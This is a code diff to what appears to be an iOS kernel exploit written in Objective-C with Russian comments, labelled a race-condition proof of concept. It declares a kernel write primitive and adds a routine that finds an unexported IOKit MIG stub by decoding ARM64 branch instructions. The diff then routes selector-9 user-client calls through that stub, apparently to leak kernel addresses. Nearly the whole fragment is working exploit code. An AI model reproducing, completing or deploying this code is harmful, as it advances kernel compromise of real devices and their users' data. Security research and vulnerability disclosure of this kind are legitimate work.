@@ -5,6 +5,7 @@
 #import <pthread.h>
 #import <stdatomic.h>
 #import <string.h>
+#import <dlfcn.h>
 #import <sys/mman.h>
 #import <sys/utsname.h>
 #import <sys/wait.h>
@@ -5329,17 +5330,36 @@ static BOOL kpHuntPtrOK(uint64_t v)
 
 // RACE PoC: состояние молотилки + сам тред
 extern void kp_rc_kwrite64(uint64_t, uint64_t);
-// io_connect_method: MIG-стаб в IOKit.framework (экспортируется, но не
-// объявлен в SDK-хидере). Полная форма с ool-памятью: ool_input → kernel
-// создаёт IOMemoryDescriptor поверх нашего диапазона → structureInputDescriptor.
+// io_connect_method (MIG-стаб) НЕ экспортируется на iOS — достаём адрес
+// стаба из публичной обёртки io_connect_method_scalarI_structureO (первый
+// bl/b внутри неё ведёт на стаб).
 typedef uint64_t *kp_scalar64_t;
-extern kern_return_t io_connect_method(mach_port_t, uint32_t,
+typedef kern_return_t (*kp_io_connect_method_fn)(
+    mach_port_t, uint32_t,
     kp_scalar64_t, mach_msg_type_number_t,
     io_struct_inband_t, mach_msg_type_number_t,
     mach_vm_address_t, mach_vm_size_t,
     kp_scalar64_t, mach_msg_type_number_t *,
     io_struct_inband_t, mach_msg_type_number_t *,
     mach_vm_address_t, mach_vm_size_t *);
+static kp_io_connect_method_fn kpFindIoConnectMethod(void)
+{
+    static kp_io_connect_method_fn fn = NULL;
+    if (fn) return fn;
+    void *w = dlsym(RTLD_DEFAULT, "io_connect_method_scalarI_structureO");
+    if (!w) return NULL;
+    uint32_t *insn = (uint32_t *)w;
+    for (int i = 0; i < 16; i++) {
+        uint32_t op = insn[i];
+        if ((op & 0xFC000000) == 0x94000000 || (op & 0xFC000000) == 0x14000000) {  // BL или B
+            int32_t imm = (int32_t)(op & 0x3FFFFFF);
+            if (imm & 0x2000000) imm |= (int32_t)0xFC000000;
+            fn = (kp_io_connect_method_fn)((uint8_t *)(insn + i) + ((int64_t)imm << 2));
+            break;
+        }
+    }
+    return fn;
+}
 static uint64_t gRaceBufs[12];
 static int gRaceN = 0;
 static uint64_t gRacePA = 0;
@@ -5480,16 +5500,19 @@ static void *kpListReaderMulti(void *arg)
 
     // 4. ФАЗА A: sel9 без молота
     uint64_t vaA = 0;
+    kp_io_connect_method_fn icm = kpFindIoConnectMethod();
+    GNOTE( [NSString stringWithFormat:@"  io_connect_method stub: %@", icm ? @"resolved" : @"НЕ НАЙДЕН"]);
+    if (!icm) { gGartLive = NO; return r; }
     {
         io_struct_inband_t outS; memset(outS, 0, sizeof(outS));
         mach_msg_type_number_t outSCnt = sizeof(outS) / 4;   // MIG: natural_t units
         mach_msg_type_number_t outCnt = 0;
-        kern_return_t kr9 = io_connect_method(conn, 9,
-                                              NULL, 0, NULL, 0,
-                                              (mach_vm_address_t)mem, 0x4000,
-                                              NULL, &outCnt,
-                                              outS, &outSCnt,
-                                              0, NULL);
+        kern_return_t kr9 = icm(conn, 9,
+                                NULL, 0, NULL, 0,
+                                (mach_vm_address_t)mem, 0x4000,
+                                NULL, &outCnt,
+                                outS, &outSCnt,
+                                0, NULL);
         GNOTE( [NSString stringWithFormat:@"  A: sel9 kr=%#x outCnt=%u outSCnt=%u", kr9, outCnt, outSCnt]);
         uint64_t *o64 = (uint64_t *)outS;
         for (int i = 0; i < 12; i++) GNOTE( [NSString stringWithFormat:@"    out[%d]=%#llx", i, o64[i]]);
@@ -5526,12 +5549,12 @@ static void *kpListReaderMulti(void *arg)
             io_struct_inband_t outS; memset(outS, 0, sizeof(outS));
             mach_msg_type_number_t outSCnt = sizeof(outS) / 4;
             mach_msg_type_number_t outCnt = 0;
-            kern_return_t kr9 = io_connect_method(conn, 9,
-                                                  NULL, 0, NULL, 0,
-                                                  (mach_vm_address_t)mem, 0x4000,
-                                                  NULL, &outCnt,
-                                                  outS, &outSCnt,
-                                                  0, NULL);
+            kern_return_t kr9 = icm(conn, 9,
+                                    NULL, 0, NULL, 0,
+                                    (mach_vm_address_t)mem, 0x4000,
+                                    NULL, &outCnt,
+                                    outS, &outSCnt,
+                                    0, NULL);
             uint64_t vaB = ((uint64_t *)outS)[0];
             if (!vaB) { if (it < 8) GNOTE( [NSString stringWithFormat:@"  B: iter=%d kr=%#x va=0", it, kr9]); continue; }
             ((volatile uint64_t *)res.contents)[0] = 0;
